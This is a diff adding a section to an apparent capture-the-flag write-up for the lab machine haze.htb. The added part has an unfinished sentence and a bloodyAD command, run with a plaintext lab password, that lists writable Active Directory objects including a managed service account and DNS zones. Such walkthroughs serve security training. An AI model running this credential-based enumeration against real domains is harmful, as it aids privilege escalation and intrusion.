@@ -427,4 +427,24 @@ Info: Download successful!
 *Evil-WinRM* PS C:\Users\mark.adams\Desktop>
 ```
 
+So after looking arou
+
+```python
+bloodyAD -d haze.htb --host dc01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' get writable 
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: DC=haze.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=haze,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.haze.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=haze,DC=htb
+permission: CREATE_CHILD
+```
 
